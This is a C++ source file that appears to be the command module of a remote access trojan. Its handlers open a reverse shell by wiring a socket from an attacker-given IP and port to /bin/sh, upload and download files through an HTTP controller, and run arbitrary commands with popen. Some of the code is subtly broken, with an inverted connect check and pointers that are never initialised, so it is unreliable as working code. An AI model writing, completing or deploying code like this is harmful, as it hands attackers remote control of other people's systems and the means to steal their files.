
#include <iostream>
#include "dirtyModules.h"


/*for reverse shell*/
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <sys/wait.h> //waitpid

using namespace std;

void 
openShell(vector<string> cmd,httpManager &manager)
{
    struct sockaddr_in sa;
    int s;
    unsigned port = std::stoul (cmd[1]);
    pid_t pid_fork;
    string response;
    int status;

    cout << "running shell." << endl;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(cmd[0].c_str());
    sa.sin_port = htons(port);
    
    pid_fork=fork();
    //if child
    if(pid_fork==0){
        if ((s = socket(AF_INET, SOCK_STREAM, 0))!=-1 ){
            if (connect(s, (struct sockaddr *)&sa, sizeof(sa))==-1){
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);

                cout << "starting bash" << endl;
                
                char ** envp;
                envp[0]=(char *)string(".").c_str();
                envp[1]=nullptr;

                char ** argv;
                argv[0] = nullptr;

                execve("/bin/sh", argv, envp);
                //no return
            }
        }
        response=string("shell failed!") + strerror (errno);
        //manager.report(response.c_str());

    }
    else
    {
        waitpid(pid_fork,&status,0 );
        //https://linux.die.net/man/2/waitpid
        if (WIFEXITED(status)){
            printf("Exited Normally\n");
        }
    }
    
}

void sendfile(vector <string> cmd,httpManager &manager)
{
    cout << "sending file "<<endl;
    manager.upload(cmd[0].c_str());
    manager.report("file upload");
}

void writefile(vector <string> cmd,httpManager &manager)
{
    cout << "file downloaded." << cmd[0] << endl;
    manager.download(cmd[0].c_str());
    manager.report("file have been moved");
}

void execute(vector <string> cmd,httpManager &manager)
{
    cout << "not implemented." << endl;
    //manager.report("not implemented yet");
}

void run(vector <string> cmd,httpManager &manager)
{
    char buffer[128];
    cout <<"running cmd" << endl;
    std::string result = "";
    FILE* pipe = popen(cmd[0].c_str(), "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);

    cout << result << endl;
    //manager.report("command run");
}

void 
isOK(httpManager &manager)
{
    manager.clientOK();
}